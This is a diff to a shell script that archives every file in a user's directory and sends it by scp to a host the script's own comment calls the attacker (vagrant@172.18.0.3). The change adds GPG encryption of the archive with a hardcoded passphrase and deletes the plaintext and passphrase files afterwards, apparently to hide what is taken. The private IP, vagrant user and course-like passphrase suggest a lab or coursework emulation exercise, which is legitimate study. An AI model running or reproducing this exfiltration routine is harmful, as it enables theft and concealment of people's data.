@@ -15,8 +15,16 @@ cd /home/resch/destination
 touch exfiltrate_backups.tar.gz
 echo "[+] Archiving all files and folders to exfiltrate..."
 tar --exclude=exfiltrate_backups.tar.gz -zcf exfiltrate_backups.tar.gz .
+echo "ict3204pwd" > pass.txt
+
+# Encrypt the archive and delete the original archived file
+echo "[+] Encrypting the archive..."
+gpg --batch --passphrase-file pass.txt -c --cipher-algo AES256 exfiltrate_backups.tar.gz
+rm exfiltrate_backups.tar.gz
+rm pass.txt
+
 cd /home/resch/.ssh
 
 # Send the tar file to attacker using scp
-scp -i /root/.ssh/id_rsa_Cserver /home/resch/destination/exfiltrate_backups.tar.gz vagrant@172.18.0.3:/home/vagrant/exfiltrated/
+scp -i /root/.ssh/id_rsa_Cserver /home/resch/destination/exfiltrate_backups.tar.gz.gpg vagrant@172.18.0.3:/home/vagrant/exfiltrated/
 echo "[+] Exfiltration complete!"
